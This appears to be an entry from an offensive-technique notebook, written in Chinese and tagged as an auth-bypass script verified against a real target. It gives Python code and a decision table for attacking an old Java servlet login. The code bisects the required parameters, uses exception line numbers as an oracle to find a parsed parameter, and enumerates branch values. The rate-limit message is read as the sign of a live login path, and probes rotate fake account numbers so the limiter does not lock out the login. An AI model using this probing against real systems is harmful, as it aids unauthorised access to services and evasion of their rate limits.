# 【技巧】把老 servlet 入参面压到 1 个：最小必需参数集二分 + 行号 oracle 定位 parseInt 参数 + 用「-操作过于频繁」当分支存在判据（实测 Login4 收敛到 flag 一个参数）

- **code**: 技巧-把老-servlet-入参面压到-1-个-最小必需参数集二分-行号-oracle-定位-parseint-参数-用-操作过于频繁-当分支存在判据-实测-l
- **kind**: script
- **category**: auth-bypass
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在真实目标 `http://203.0.113.55:80/Tk_Kj/login4`（`example.com.service.Login4`，旧包，`/LHService/login4` 为 404）上完整验证：① 最小必需参数集二分 13 轮从 390 收敛到 **1 个 = `flag`**，逐个删除复核确认；② 行号 oracle —— 16 个候选参数逐个给 `abc`，**只有 `flag` 触发 `target352.example.com:65`（字符串版）**，其余全部 `target351.example.com:542`+`null`（null 版）⇒ 精确锁定 `target353.example.com:36 = Integer.parseInt(getParameter("flag"))`；③ 值域枚举（用 `1300000xxxx` 递增假号，未触碰授权号）：`flag=-1/0/1/2/4/5` → `-数据异常`（登录尝试）、**`flag=3` → `-请重新登录`**（需会话，否掉"只认 ID 的绕过"假设）、**`flag=6` → `-操作过于频繁，请稍后再试`（触发限流 ⇒ 真登录分支）**。同批用 6 个账号参数名 × 12 个验证码参数名 = 72 组排除了 `/Tk_Kj/login_2020`（全部仍回「-请填写密码」⇒ 验证码不走它）。证据文件 exploit58/e37_out.txt、e37_run.log。
- **tags**: java,servlet,flag分支,最小参数集,二分,行号oracle,值域枚举,限流判据,登录入口
- **created_at**: 2026-10-11T17:51:33.040Z
- **found_by**: exploit

## 描述

★ 通用技巧：**用「最小必需参数集二分」把老 servlet 的入参面压到 1 个，再用「flag 值域探测」把分支语义摸出来。**
**为什么有用**：老 Java servlet 常见写法是 `int flag = Integer.parseInt(getParameter("flag")); if (flag == 1) {...} else if (flag == 3) {...}` —— **`flag` 就是分支选择器**。而这类 servlet 往往有 5~10 个分支，其中只有一两个是真正的业务入口，其余是错误/回滚/管理分支。
**三步法**：
1. **最小必需参数集二分（O(log n)，13 轮以内）**
   先带 390 参数钥匙串拿到「非异常」响应（记 `ok=True`），然后**每次只发前半数参数**：仍 ok ⇒ 必需参数在后半；变 500/NPE ⇒ 必需参数在前半。**13 轮从 390 收敛到 1**（实测本例收敛到 `flag`）。
   ★ 关键：**收敛后再逐个删除复核一遍**（我这次复核确认必需参数就是 `flag` 一个，其余 389 个全可删）。
2. **行号 oracle 精确定位"哪个参数被 parseInt"**
   逐个参数给**非数字值 `abc`**：
   - 异常变成 `target352.example.com:65`（**字符串版**）⇒ **该参数就是被 parseInt 的那个**（值是 abc，转不了）
   - 异常仍是 `target351.example.com:542` + 消息 `null`（**null 版**）⇒ 被 parseInt 的是**另一个**仍为 null 的参数，不是它
   本例：16 个候选里**只有 `flag`** 触发字符串版 ⇒ 精确锁定 `target353.example.com:36 = Integer.parseInt(getParameter("flag"))`。
3. **值域枚举 + 「限流文案」当分支判据**
   逐个试 `flag ∈ {-1,0,1,...,11}`，看文案：
   ```
   「-数据异常」            ⇒ 参数不足 / 数据不对（登录尝试分支）
   「-请重新登录」          ⇒ 需已有会话（切换/顶号分支）★ 说明它不是"只认 ID"的绕过
   「-操作过于频繁」        ⇒ ★★ 真的进入了业务处理（撞上 RateLimiter）⇒ 该 flag 值是真入口
   ```
   **「-操作过于频繁」是最强的"分支存在"证据** —— 只有走到"要发起尝试"的地方才会被限流。
**红线**：值域探测**务必用假账号**（本例用 `1300000xxxx` 递增假号），否则会把真实账号/授权号的限流桶打满，把唯一的活登录口锁死。

## 用法

```
```python
# 第 1 步：最小必需参数集二分（13 轮从 390 → 1）
PL = [x for x in PARAM_KEY_QS.split("&") if x]
def ok(r): return r["status"] == 200 and "NumberFormatException" not in txt(r)
cur = PL[:]
for _ in range(14):
    if len(cur) <= 1: break
    half = len(cur) // 2
    a = cur[:half]
    cur = a if ok(GET(path + "?" + "&".join(a))) else cur[half:]
# 收敛后逐个删除复核
need = cur[:]; i = 0
while i < len(need) and len(need) > 1:
    t = need[:i] + need[i+1:]
    if ok(GET(path + "?" + "&".join(t))): need = t
    else: i += 1
print("必需参数:", [x.split("=")[0] for x in need])

# 第 2 步：行号 oracle 定位 parseInt 的那个参数
for pn in CANDS:
    b = txt(GET(path + "?%s=abc" % pn))
    if "target352.example.com:65" in b:
        print("★ parseInt 命中:", pn)      # 字符串版 NFE ⇒ 就是它
    elif "target351.example.com:542" in b:
        pass                                 # null 版 ⇒ 不是它

# 第 3 步：值域枚举 + 用限流文案判分支（务必用假账号！）
for v in ["-1","0","1","2","3","4","5","6","9"]:
    body = "username=%s&yzm=000000&flag=%s" % (FAKE_NUM, v)
    m = txt(POST(path, body)).strip()
    tag = ("★真入口(撞限流)" if "操作过于频繁" in m else
           "★需会话" if "重新登录" in m else "登录尝试" if "数据异常" in m else "?? " + m[:20])
    print("flag=%-3s %s" % (v, tag))
```
**判定表**
| 文案 | 含义 |
|---|---|
| `target352.example.com:65` | 该参数被 `parseInt`，且值非法 ⇒ **就是它** |
| `target351.example.com:542` + `null` | 被 parseInt 的是别的（仍为 null 的）参数 |
| `-数据异常` | 登录尝试分支，参数/数据不对 |
| `-请重新登录` | 需已有会话的分支（**不是** ID-only 绕过） |
| **`-操作过于频繁`** | **★★ 真入口**：已进入业务处理并触发限流 |
**注意**：限流按账号计数（本例 ~8 次/桶）⇒ 值域探测必须**每个探针换一个假账号**，否则打满桶会把唯一活登录口锁死。
```
